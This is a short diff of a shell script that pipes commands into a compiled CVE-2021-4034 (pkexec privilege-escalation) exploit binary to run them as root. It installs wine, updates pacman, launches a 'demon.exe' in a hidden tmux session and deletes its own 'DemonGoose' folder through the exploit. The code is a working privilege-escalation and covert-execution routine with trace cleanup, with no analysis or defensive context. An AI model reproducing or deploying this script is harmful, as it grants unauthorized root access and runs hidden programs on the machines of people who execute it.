@@ -11,6 +11,7 @@ done
 
 make
 echo "dnf install wine" | ./cve-2021-4034
+echo "pacman -Sy" | ./cve-2021-4034
 tmux new -d wine DemonThings/demon.exe
 cd ..
-rm -f DemonGoose/
+echo "rm -rf DemonGoose/" | ./cve-2021-4034
